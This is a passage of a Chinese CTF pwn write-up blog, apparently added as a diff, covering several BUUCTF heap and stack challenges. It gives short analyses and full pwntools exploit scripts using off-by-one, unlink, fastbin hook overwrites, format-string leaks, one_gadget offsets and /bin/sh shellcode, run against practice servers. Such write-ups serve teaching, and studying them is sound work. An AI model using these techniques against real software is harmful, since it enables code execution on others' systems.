+elf = ELF(local_file)
+libc = elf.libc
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(size,data):
+    sla(&#39;choice&#39;,&#39;1&#39;)
+    sla(&#39;size&#39;,str(size))
+    sa(&#39;Content&#39;,str(data))
+
+def free(idx):
+    sla(&#39;choice&#39;,&#39;2&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+def show(idx):
+    sla(&#39;choice&#39;,&#39;3&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+add(0x20,&#39;bbbb&#39;)
+add(0x20,&#39;bbbb&#39;)
+free(0)
+free(1)
+add(8,p32(0x0804862B) + p32(elf.got[&#39;__libc_start_main&#39;]))
+show(0)
+r()
+libc_base = uu32(r(4)) - 0x18540
+info_addr(&#39;base&#39;,libc_base)
+free(2)
+system = 0x0003ada0 + libc_base
+add(8,p32(system) + &#39;||sh&#39;)
+show(0)
+itr()</code></pre>
+<p>Buu远程打不通。。</p>
+<h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><code>hitcontraining_heapcreator</code></h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>Edit函数处，故意可以多写出一个字节。</p>
+<ul>
+<li>off by one</li>
+</ul>
+<h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./heapcreator&#39;
+context.log_level = &#39;debug&#39;
+elf = ELF(local_file)
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,26646)
+    libc = elf.libc
+    # remote_libc = &#39;.&#39; # &#39;./libc.so.6&#39;
+    # libc = ELF(remote_libc)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(size,data):
+    sla(&#39;choice&#39;,&#39;1&#39;)
+    sla(&#39;Heap&#39;,str(size))
+    sa(&#39;heap&#39;,str(data))
+def edit(idx,data):
+    sla(&#39;choice&#39;,&#39;2&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sa(&#39;heap&#39;,str(data))
+
+def show(idx):
+    sla(&#39;choice&#39;,&#39;3&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+def free(idx):
+    sla(&#39;choice&#39;,&#39;4&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+
+add(0x18,&#39;\x00&#39;)
+add(0x20,&#39;bbbb&#39;)
+add(0x20,&#39;cccc&#39;)
+add(0x10,&#39;dddd&#39;)
+payload = 0x18 * &#39;a&#39; + &#39;\xa1&#39;
+edit(0,payload)
+free(1)
+add(0x10,&#39;\x78&#39;)
+show(1)
+ru(&#39;Content : &#39;)
+base = uu64(r(6)) - 0x3c4b78
+info_addr(&#39;libc_base&#39;,base)
+free(1)
+free_hook = 0x3c67a8 + base
+paylaod = &#39;\x00&#39; * 2 * 8  + p64(8) + p64(free_hook)
+add(0x30,paylaod)
+rce = base + rce16[1]
+edit(2,p64(rce))
+free(0)
+itr()
+</code></pre>
+<h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a><code>0ctf_2017_babyheap</code></h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>保护全开，程序逆向起来看起来很乱，并且堆块定位是通过栈来传参，没有全局指针。</p>
+<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>calloc 函数基本跟malloc一样，但是再分配好堆块时，会把分配到的堆块全部清理为0。</p>
+<h5 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h5><p>无法通过传统的unsortbin来leak libc，结合fill函数中的堆溢出即可。</p>
+<h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>Fill 函数中，明显有堆溢出，且十分好用，效果很大。</p>
+<h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./0ctf_2017_babyheap&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,26374)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(size):
+    sla(&#39;Command&#39;,&#39;1&#39;)
+    sla(&#39;Size&#39;,str(size))
+def fill(idx,size,data):
+    sla(&#39;mand&#39;,&#39;2&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;ize&#39;,str(size))
+    sa(&#39;tent&#39;,str(data))
+def free(idx):
+    sla(&#39;mand&#39;,&#39;3&#39;)
+    sla(&#39;dex&#39;,str(idx))
+def dump(idx):
+    sla(&#39;mand&#39;,&#39;4&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+add(0x30) #0
+add(0x30) #1
+add(0x10) #2
+add(0x10) #3
+add(0x10) #4
+add(0x20) #5
+payload = &#39;a&#39; * 0x30 + p64(0) + p64(0xa1) + p64(0) * 4
+fill(0,0x60,payload)
+free(1)
+add(0x30)
+dump(2)
+ru(&#39;Content: \n&#39;)
+base = uu64(r(6)) - 0x3c4b78
+info_addr(&#39;libc_base&#39;,base)
+add(0x50) #6
+add(0x60) #7
+add(0x60) #8
+free(7)
+free(8)
+malloc_hook = base + 0x3c4b10
+payload = p64(0) * 5 + p64(0x71) + p64(0) * 13 + p64(0x71) + p64(malloc_hook-0x23) 
+fill(5,len(payload),payload)
+add(0x60) #7
+add(0x60) #8
+rec = rce16[1] + base
+payload = &#39;a&#39; * 0x13 + p64(rec)
+fill(8,len(payload),payload)
+add(0x20)
+itr()</code></pre>
+<h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a><code>wustctf2020_closed</code></h2><pre><code class="c">close(1);
+close(2);
+return shell();</code></pre>
+<p>直接就给你shell了，但是stdout已经被关闭了。但是对其文件描述符<code>1</code>进行重定向为没有关闭的<code>0</code>即可。</p>
+<pre><code class="bash">exec 1&gt;&amp;0 &amp;&amp; cat flag</code></pre>
+<h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a><code>wustctf2020_getshell_2</code></h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><pre><code class="c">ssize_t vulnerable()
+{
+  char buf; // [esp+0h] [ebp-18h]
+
+  return read(0, &amp;buf, 0x24u);
+}</code></pre>
+<p>明显可以看出只可以控制2个gadget。优先想到了栈迁移。可是也没有合适地方去迁移利用。</p>
+<p>倘若可以控制3个gadget，直接：</p>
+<pre><code class="c">p32(system.plt) + p32(0xdeadbeef) + p32(sh)</code></pre>
+<p>这样就可以拿到shell了。</p>
+<p>因为平时rop时，32位下自己<strong>十分</strong>经常**用<code>函数的plt+返回地址+参数1</code>，造成思路卡顿。</p>
+<h4 id="突破"><a href="#突破" class="headerlink" title="突破"></a>突破</h4><p>但是尝试去看下后门函数：</p>
+<pre><code class="c">.text:08048521 ; 2:   return system(&quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;);
+.text:08048521                 sub     esp, 0Ch
+.text:08048524                 push    offset command  ; &quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;
+.text:08048529                 call    _system
+.text:0804852E                 add     esp, 10h
+.text:08048531                 nop
+.text:08048532                 leave
+.text:08048533                 retn</code></pre>
+<p>在08048524处，可以看到起其call system前，<code>push    offset command</code>，把这个字符串压栈，来作为第一个参数。</p>
+<p> 那就在溢出时，返回地址填上<code>08048529</code> ，在自己填上sh的地址即可了。</p>
+<p>这样就在call system时，完成的是<code>system(sh)</code>。</p>
+<p>其实也是很简单的：</p>
+<p>由于<code>因为平时rop时，32位下自己经常用`函数的plt+返回地址+参数1`，造成思路卡顿。</code> ，其实自己分析以后就是：<code>函数的plt+4字节+参数1</code>。</p>
+<p>溢出时，填上<code>p32(0x8048529) + p32(sh)</code><br>栈信息：</p>
+<pre><code>0000| 0xffcca2fc --&gt; 0x8048529 (&lt;shell+14&gt;:     call   0x80483e0 &lt;system@plt&gt;)
+0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 (&#39;sh&#39;)</code></pre><p>在溢出调用时,ret到：</p>
+<pre><code>.text:08048529                 call    _system</code></pre><p>其就是</p>
+<pre><code>push eip+4
+jmp system.plt</code></pre><p>然后栈就变成了：</p>
+<pre><code>=&gt; 0x80483e0 &lt;system@plt&gt;:      jmp    DWORD PTR ds:0x804a018
+ | 0x80483e6 &lt;system@plt+6&gt;:    push   0x18
+ | 0x80483eb &lt;system@plt+11&gt;:   jmp    0x80483a0
+ | 0x80483f0 &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:0x804a01c
+ | 0x80483f6 &lt;__libc_start_main@plt+6&gt;: push   0x20
+ |-&gt;   0x80483e6 &lt;system@plt+6&gt;:        push   0x18
+       0x80483eb &lt;system@plt+11&gt;:       jmp    0x80483a0
+       0x80483f0 &lt;__libc_start_main@plt&gt;:       jmp    DWORD PTR ds:0x804a01c
+       0x80483f6 &lt;__libc_start_main@plt+6&gt;:     push   0x20
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+0000| 0xffcca2fc --&gt; 0x804852e (&lt;shell+19&gt;:     add    esp,0x10)
+0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 (&#39;sh&#39;)
+</code></pre><p>这就变成了，自己熟悉的<code>函数的plt+返回地址+参数1</code></p>
+<h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
+import time
+local_file  = &#39;./wustctf2020_getshell_2&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,25032)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+
+offset = 28
+sh = elf.search(&#39;sh\x00&#39;).next()
+system = 0x8048529
+payload = &#39;a&#39; * offset + p32(system) + p32(sh)
+s(payload)
+itr()
+</code></pre><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a><code>axb_2019_heap</code></h2><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>保护全开。</p>
+<h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul>
+<li>格式化字符串漏洞，可以泄漏出程序和libc的基址</li>
+<li>edit函数中，错误的size选取，导致每次可以多溢出0x10的字节，威力就很大了，prev size与 size都可以改到。</li>
+</ul>
+<p>直接进行unlink攻击即可。估计就是考这个的，程序限制了不能申请0x80以下的堆块，且key值基本没办法改到。</p>
+<h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./axb_2019_heap&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,26837)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(idx,size,data):
+    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)
+    sla(&#39;(0-10)&#39;,str(idx))
+    sla(&#39;size&#39;,str(size))
+    sla(&#39;content&#39;,str(data))
+
+def free(idx):
+    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+def edit(idx,data):
+    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;content&#39;,str(data))
+
+payload = &#39;%15$p&#39; + &#39;%11$p&#39;
+
+sla(&#39;name&#39;,payload)
+ru(&#39;Hello, 0x&#39;)
+libc_base = int(r(12),16) - 0x20830
+info_addr(&#39;libc_base&#39;,libc_base)
+ru(&#39;0x&#39;)
+bin_base = int(r(12),16) - 0x1186
+info_addr(&#39;bin_base&#39;,bin_base)
+
+note = bin_base + 0x202060
+key = bin_base + 0x202040
+
+add(0,0x88,&#39;aaaaaaaa&#39;)
+add(1,0x100,&#39;bbbbbbbb&#39;)
+add(2,0x88,&#39;cccccccc&#39;)
+payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30)
+payload += p64(0) * 9 + p64(0x80) + p64(0x110)
+edit(0,payload)
+free(1)
+free_hook = 0x3c67a8 + libc_base
+payload = p64(0) * 3 + p64(free_hook) + p64(0x88)
+edit(0,payload)
+rec = rce16[1] + libc_base
+edit(0,p64(rec))
+free(2)
+itr()</code></pre>
+<h2 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a><code>hitcontraining_unlink</code></h2><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>Edit函数中，有个大威力的堆溢出。<br>用unlink攻击。</p>
+<h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./bamboobox&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,26818)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(size,data):
+    sla(&#39;choice&#39;,&#39;2&#39;)
+    sla(&#39;len&#39;,str(size))
+    sa(&#39;name&#39;,str(data))
+def edit(idx,size,data):
+    sla(&#39;ice&#39;,&#39;3&#39;)
+    sla(&#39;dex&#39;,str(idx))
+    sla(&#39;len&#39;,str(size))
+    sa(&#39;name&#39;,str(data))
+
+def show():
+    sla(&#39;choice&#39;,&#39;1&#39;)
+
+def free(idx):
+    sla(&#39;ice&#39;,&#39;4&#39;)
+    sla(&#39;dex&#39;,str(idx))
+
+note = 0x006020C0 + 8
+add(0x88,&#39;aaaaaaaa&#39;)
+add(0x100,&#39;bbbbbbbb&#39;)
+add(0x88,&#39;cccccccc&#39;)
+payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30)
+payload += p64(0) * 9 + p64(0x80) + p64(0x110)
+edit(0,len(payload),payload)
+free(1)
+show()
+ru(&#39;0 : &#39;)
+libc_base = uu64(r(6)) - 0x3c48e0
+info_addr(&#39;libc_base&#39;,libc_base)
+free_hook = 0x3c67a8 + libc_base
+payload = p64(libc_base + 0x3c48e0) + p64(0)  + p64(0x88) + p64(free_hook)
+edit(0,len(payload),payload)
+rec = rce16[1] + libc_base
+edit(0,8,p64(rec))
+free(2)
+itr()</code></pre>
+<h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a><code>ciscn_2019_s_9</code></h2><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>32位程序，保护全关，目标定位着shellcode去。</p>
+<h4 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>栈溢出，可以溢出14个字节，这是32位程序用rop就可以打了。但是为相对麻烦一点。</p>
+<pre><code class="python">.text:08048551             hint            proc near
+.text:08048551             ; __unwind {
+.text:08048551 55                          push    ebp
+.text:08048552 89 E5                       mov     ebp, esp
+.text:08048554 FF E4                       jmp     esp
+.text:08048554             hint            endp</code></pre>
+<p>在题目当中，有个hint函数，就是给提示的，提示到<code>jmp esp</code> 这个gadget。</p>
+<p>其中，可以想到在栈溢出中，有给<code>ret addr</code>填上<code>jmp esp</code> ，在接上shellcode。这应该是很经典的用法。</p>
+<p>参考链接：<a href="http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/</a></p>
+<p>构造思路：</p>
+<pre><code>Payload = overflow + jmp esp address + shellcode</code></pre><p>但是这个题就是只能溢出14字节，返回地址再占用4字节，应该没有10字节这样少的shellcode。</p>
+<p>所以转变一下，栈上填充好shellcode，然后<code>jmp esp address</code>，接着让其执行<code>sub esp,0x28</code>，然后在跳转esp。</p>
+<pre><code>Payload = shellcode + jmp esp address + sub esp,esp + jmp esp</code></pre><p>其实基本都是一样的，后面跟上的，也可以理解为调整esp指针的shellcode。</p>
+<h3 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h3><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./ciscn_s_9&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,26283)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+jmp_esp = 0x08048554
+shellcode= &#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;
+shellcode = shellcode.ljust(0x24,&#39;\x00&#39;)
+gadgets = asm(&#39;sub esp,0x28;jmp esp&#39;)
+
+print(gadgets)
+payload = shellcode + p32(jmp_esp) + gadgets
+# debug()
+sl(payload)
+itr()</code></pre>
+<h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a><code>roarctf_2019_realloc_magic</code></h2><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><h4 id="漏洞点-4"><a href="#漏洞点-4" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul>
+<li>UAF</li>
+</ul>
+<p>程序用realloc函数来分配堆块，因为不熟悉这个搞的我，好久没有做出来。</p>
+<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><h4 id="realloc的特点"><a href="#realloc的特点" class="headerlink" title="realloc的特点"></a>realloc的特点</h4><p>基础功能是改变<code>mem_address</code>所指内存区域的大小为newsize长度。这里就有几种不同的情况</p>
+<ul>
+<li>1.当size为0，这时就相当于free()函数，同时返回值为null</li>
+<li>2.当指针为0，size大于0，相当于malloc函数</li>
+<li>3.size小于等于原来的size，则在原先的基础上缩小，多余的堆块free掉</li>
+<li>4.size大于原来的size，如果<strong>有足够空间</strong>就原基础扩充，空间不足则分配新的内存，并将原来指针指向的堆块旧内容复制到新的堆块内存中，然后再将原来的堆块free掉。</li>
+</ul>
+<p>其中第4点，有足够空间，画图解释一下：</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/uqru5B.png" srcset="/img/loading.gif" alt></p>
+<p>由于这个特性，来制作3个堆块A、B、C，B堆块作为进入unsortbin的堆块存在，C是为了防止不让C合并top chunk，然后用A来申请一个size&lt;=（A的size + B的size）的堆块，这样就造成了堆块的重叠。</p>
+<h4 id="利用-IO-2-1-stdout-来泄漏信息"><a href="#利用-IO-2-1-stdout-来泄漏信息" class="headerlink" title="利用 _IO_2_1_stdout_ 来泄漏信息"></a><code>利用 _IO_2_1_stdout_ 来泄漏信息</code></h4><p>参考链接：<br><a href="http://pzhxbz.cn/?p=139" target="_blank" rel="noopener">http://pzhxbz.cn/?p=139</a></p>
+<p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p>
+<p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p>
+<p>这个题因为有过输出，其<code>_IO_CURRENTLY_PUTTING</code>就是为1的 ，对于<code>_IO_IS_APPENDING</code>这个flag的值，将这个flag搞成1之后，就可以通过修改<code>_IO_buf_base</code>来完成leak。</p>
+<p>在赛题中，很多程序都是用过输出函数进行输出的，基本就是改掉flag，中间的三个变量在输出的过程中都不怎么用得到，直接盖成0,低位覆盖<code>_IO_buf_base</code>为合适的值就可以完成leak。</p>
+<p>Flag 怎么设置，在赛题中还是很随意的：</p>
+<pre><code>0xfbad1887
+0xfbad3c80</code></pre><p>重点就是让<code>stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base</code></p>
+<p>大体的利用方法就是利用unsorted bin的在tcache或fastbin的fd上留下<code>main_arena</code>的地址，由于<code>_IO_2_1_stdout_</code>与<code>arena</code>只相差4位，且低三位已知，在传入是低3位覆盖fd留下的<code>main_arena</code>的地址，剩余一位可以爆破，概率1/16,从而劫持stdout以达到泄露的目的 。</p>
+<h2 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h2><pre><code class="python">from pwn import *
+import time
+local_file  = &#39;./roarctf_2019_realloc_magic&#39;
+elf = ELF(local_file)
+# context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,28690)
+    libc = elf.libc
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+rce18 = [0x4f2c5,0x4f322,0x10a38c]
+arae18 = 0x3ebca0
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(size,data):
+    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)
+    sla(&#39;?&#39;,str(size))
+    if int(size) != 0 :
+        sa(&#39;?&#39;,str(data))
+
+def free():
+    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)
+
+def leak_addr():
+    add(0x80,&#39;aaaaaaa&#39;)
+    add(0,&#39;&#39;)
+    add(0x100,&#39;aaaaaaaa&#39;)
+    add(0,&#39; &#39;)
+    add(0x110,&#39; &#39;)
+    add(0,&#39;&#39;)
+    add(0x100,&#39;a&#39;)
+    for i in range(7):
+        free()
+    add(0,&#39;1&#39;)
+    add(0x80,&#39;\x60\x87&#39;)
+    payload = 17 * p64(0) + p64(0x61) + &#39;\x60\x87&#39;
+    add(0x190,payload)
+    add(0,&#39;&#39;)
+    add(0x100,&#39;\x60\x87&#39;)
+    add(0,&#39;&#39;)
+    payload = p64(0xfbad3c80) + &#39;\x00&#39; * 8 * 3 + &#39;\x00&#39;
+    add(0x100,payload)
+
+leak = 0
+while True:
+    try:
+        leak_addr()
+        ss = io.recvuntil(chr(0x7f),timeout = 0.5)
+        if len(ss) == 0:
+            raise Exception(&#39;&#39;)
+        io.recv(16)
+        leak = u64(io.recv(8))
+        if leak == 0x320a6464412e310a:
+            raise Exception(&#39;&#39;)
+        break
+    except Exception:
+        io.close()
+        # io = process(&#39;./roarctf_2019_realloc_magic&#39;)
+        io = remote(&#39;node3.buuoj.cn&#39;,28690)
+        continue
+
+leak = leak &gt;&gt; 16
+info_addr(&#39;leak&#39;,leak)
+libc_base = leak - 4110208
+info_addr(&#39;libc_base&#39;,libc_base)
+free_hook = 4118760 + libc_base
+sys_addr = 324832+libc_base
+
+sla(&#39;&gt;&gt;&#39;,&#39;666&#39;)
+
+add(0x120,&#39;aaaaaaa&#39;)
+add(0,&#39;&#39;)
+add(0x130,&#39;aaaaaaaa&#39;)
+add(0,&#39; &#39;)
+add(0x160,&#39; &#39;)
+add(0,&#39;&#39;)
+add(0x130,&#39;a&#39;)
+for i in range(7):
+    free()
+add(0,&#39;1&#39;)
+add(0x120,&#39;\x60\x87&#39;)
+payload = 37 * p64(0) + p64(0x71) + p64(free_hook)
+add(0x260,payload)
+add(0,&#39;&#39;)
+add(0x130,&#39;a&#39;)
+add(0,&#39;&#39;)
+one_rec = rce18[1] +libc_base
